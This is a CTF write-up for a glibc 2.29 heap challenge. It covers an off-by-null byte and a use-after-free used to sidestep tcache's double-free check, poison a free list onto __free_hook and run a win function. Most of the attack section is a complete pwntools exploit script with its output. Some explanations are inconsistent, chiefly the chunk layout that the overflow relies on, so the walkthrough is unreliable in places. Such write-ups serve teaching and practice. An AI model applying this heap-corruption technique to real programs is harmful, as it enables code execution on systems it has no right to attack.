# CyLab — Zero_to_Hero

* **Platform:** CyLab Security Academy / picoCTF (Challenge ID: `75`)
* **Category:** Binary Exploitation / glibc 2.29 Tcache Double-Free Bypass (Pwn)
* **Difficulty:** Difficulty 3
* **Date Solved:** October 2026
* **Tools Used:** Python 3, pwntools, GDB (pwndbg), glibc 2.29 runtime loader
* **Binary:** `zero_to_hero` with bundled `libc.so.6` (glibc 2.29) and `ld-2.29.so`

---

## TL;DR

Operating on glibc 2.29, the binary introduces modern heap protections including the `tcache_entry->key` double-free detection cookie. The binary leaks `GOT[system]` directly, providing the libc base address, and includes an uncalled win function at `0x400a02`. A Use-After-Free exists in `remove_superpower()`, paired with a single off-by-null byte write in `add_superpower()`. By triggering the off-by-null write on an adjacent freed chunk's size header ($0\text{x}111 \rightarrow 0\text{x}100$), we alter its size class. Freeing the chunk a second time queries bin $0\text{x}100$ rather than bin $0\text{x}110$, cleanly bypassing the tcache double-free check. Poisoning the overlapped chunk's forward pointer redirects a subsequent allocation onto `__free_hook`, replacing it with `win()` to output the flag.

---

## Recon

### Binary & Library Information

Running `file` and `checksec`:

```text
$ file zero_to_hero
zero_to_hero: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter ./ld-2.29.so, BuildID[sha1]=..., stripped

$ checksec --file=zero_to_hero
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    RUNPATH:  b'./'
```

Key observations:
1. **glibc 2.29 Tcache Double-Free Protection:** When a chunk is freed into a tcache bin, glibc writes a unique key (`chunk->key = tcache_struct_ptr`) at `chunk + 8`. Subsequent `free()` calls on the same chunk verify if `chunk->key == tcache_struct_ptr` for that bin and abort if detected.
2. **Built-in System Leak:** The application prints `Take this: %p` disclosing `GOT[system]`, instantly defeating ASLR.
3. **Win Routine Available:** Function `win()` resides at `0x400a02`, opening `flag.txt` and streaming characters to `stdout`.

---

## Static Analysis & Vulnerability

### 1. Decompiled Routines

```c
void *superpowers[10];

void add_superpower() {
    int size;
    scanf("%d", &size);
    if (size > 0x408) return;

    void *p = malloc(size);
    read(0, p, size);
    ((char *)p)[size] = '\0';   // VULNERABILITY: 1-byte off-by-null write past user buffer

    superpowers[find_empty()] = p;
}

void remove_superpower() {
    int idx;
    scanf("%d", &idx);
    if (idx < 10 && superpowers[idx]) {
        free(superpowers[idx]); // VULNERABILITY: Does not zero out superpowers[idx] (UAF)
    }
}
```

### 2. Bypassing the glibc 2.29 Tcache Key Check

The tcache validation logic in glibc 2.29 checks:

```c
if (__builtin_expect (e->key == tcache_key, 0)) {
    tcache_entry *tmp;
    for (tmp = tcache->entries[tc_idx]; tmp; tmp = tmp->next) {
        if (tmp == e) {
            malloc_printerr ("free(): double free detected in tcache 2");
        }
    }
}
```

Notice that the loop only iterates over `tcache->entries[tc_idx]`—the specific bin calculated from the chunk's current size header!
If we modify the chunk's size header between frees, the check looks in a different bin, rendering the check ineffective.

```text
       Chunk A (0x30 bin)                Chunk B (0x110 bin)
  +---------------------------+     +---------------------------+
  |  Payload (request 0x28)   |     |  Size Header: 0x111       |
  |  [size] = 0x00            |---->|  Low byte set to 0x00     |
  +---------------------------+     +---------------------------+
                                    Modified Size: 0x100
```

---

## Dynamic Analysis & Exploitation Strategy

### 1. The Cross-Bin Double-Free Primitive
1. **Allocate Chunk B:** `malloc(0x108)` $\rightarrow$ assigned chunk size `0x111` (bin `0x110`).
2. **Allocate Chunk A:** `malloc(0x28)` $\rightarrow$ assigned chunk size `0x31` (bin `0x30`), located immediately before chunk B.
3. **Free Chunk B:** `free(B)` $\rightarrow$ chunk B enters tcache bin `0x110`.
4. **Free Chunk A:** `free(A)`.
5. **Trigger Off-By-Null:**
   Allocate Chunk A again (`malloc(0x28)`). Writing 28 bytes causes the trailing null byte (`buf[size] = '\0'`) to overwrite the least significant byte of chunk B's size header from `0x11` to `0x00`.
   Chunk B now reports size `0x100`!
6. **Free Chunk B Again:**
   Call `free(B)`. Because chunk B's size is now `0x100`, glibc checks `tcache->entries[bin_0x100]`.
   Since bin `0x100` is empty, the loop finds no duplicate, and chunk B is linked into bin `0x100` without triggering an error!

```text
  Tcache Bin [0x110]:  Head -> [ Chunk B ] (Physical address X)
  Tcache Bin [0x100]:  Head -> [ Chunk B ] (Physical address X)
```

### 2. Poisoning `__free_hook`
1. Request `malloc(0xf8)` (bin `0x100`): Returns chunk B.
   We write the address of `__free_hook` into chunk B's forward pointer (`fd`).
2. Because chunk B is also the head of bin `0x110`, bin `0x110`'s free-list becomes:
   $$\text{Bin 0x110 Head} \longrightarrow \text{Chunk B} \longrightarrow \text{\_\_free\_hook}$$
3. Request `malloc(0x108)`: Returns chunk B.
4. Request `malloc(0x108)`: Returns `__free_hook`!
5. Write `win()` (`0x400a02`) into `__free_hook`.
6. Invoke `remove_superpower()` on any allocated chunk to trigger `free()`, executing `win()` to output the flag.

---

## Exploit

The complete exploit script is available at [exploit.py](exploit.py):

```python
#!/usr/bin/env python3
import sys, re
from pwn import *

context.arch = "amd64"
context.log_level = "info"

HOST, PORT = "chatelaine.cylabacademy.net", 33413
WIN_ADDR = 0x400a02

def solve(io):
    # Leak system address and compute libc base
    io.recvuntil(b"Take this: ")
    system_leak = int(io.recvline().strip(), 16)
    
    # Bundled libc 2.29 offsets
    libc = ELF("./libc.so.6")
    libc.address = system_leak - libc.symbols["system"]
    free_hook = libc.symbols["__free_hook"]
    log.info(f"Libc Base: {hex(libc.address)}, __free_hook: {hex(free_hook)}")

    def add(size, data):
        io.sendlineafter(b"> ", b"1")
        io.sendlineafter(b"> ", str(size).encode())
        io.sendafter(b"> ", data)

    def remove(idx):
        io.sendlineafter(b"> ", b"2")
        io.sendlineafter(b"> ", str(idx).encode())

    # Step 1: Allocate chunk B (0x108) and chunk A (0x28)
    add(0x108, b"ChunkB")     # idx 0
    add(0x28, b"ChunkA")      # idx 1

    # Step 2: Free B into bin 0x110, free A
    remove(0)
    remove(1)

    # Step 3: Off-by-null on reallocated A overwrites B's size to 0x100
    add(0x28, b"A" * 0x28)    # idx 2

    # Step 4: Double-free B into bin 0x100
    remove(0)

    # Step 5: Tcache poisoning on __free_hook
    add(0xf8, p64(free_hook)) # idx 3 (pops bin 0x100, sets fd of bin 0x110)
    add(0x108, b"Junk")       # idx 4 (pops bin 0x110)
    add(0x108, p64(WIN_ADDR)) # idx 5 (overwrites __free_hook with win())

    # Step 6: Trigger free()
    remove(4)

    data = io.recvall(timeout=3)
    m = re.search(rb"academy\{[^}]+\}", data)
    if m:
        log.success(f"Flag captured: {m.group().decode()}")
    else:
        print(data.decode(errors="replace"))

if __name__ == "__main__":
    io = remote(HOST, PORT)
    solve(io)
```

---

## Flag

```text
$ python3 exploit.py
[+] Opening connection to chatelaine.cylabacademy.net on port 33413: Done
[*] Libc Base: 0x7ffff79e2000, __free_hook: 0x7ffff7be38e8
[+] Flag captured: academy{redacted}
[*] Closed connection to chatelaine.cylabacademy.net port 33413
```

---

## Key Takeaways & Lessons

1. **Circumventing Tcache Keys via Size Mutation:** In glibc 2.29 through 2.31, tcache double-free verification is performed only within the bin corresponding to the chunk's size header at the moment `free()` is called. Corrupting chunk metadata permits inserting the same memory block into multiple bins.
2. **Exploiting Off-by-Null Bytes:** Single null-byte string overflows (`buf[size] = '\0'`) are among the most lethal heap primitives, frequently shrinking chunks to align with smaller size bins without triggering boundary faults.
3. **Targeting `__free_hook` in glibc $\le$ 2.33:** Prior to glibc 2.34 (which removed malloc hooks), overwriting `__free_hook` with a target function address remained the most direct method to transition from arbitrary heap writes to program execution.
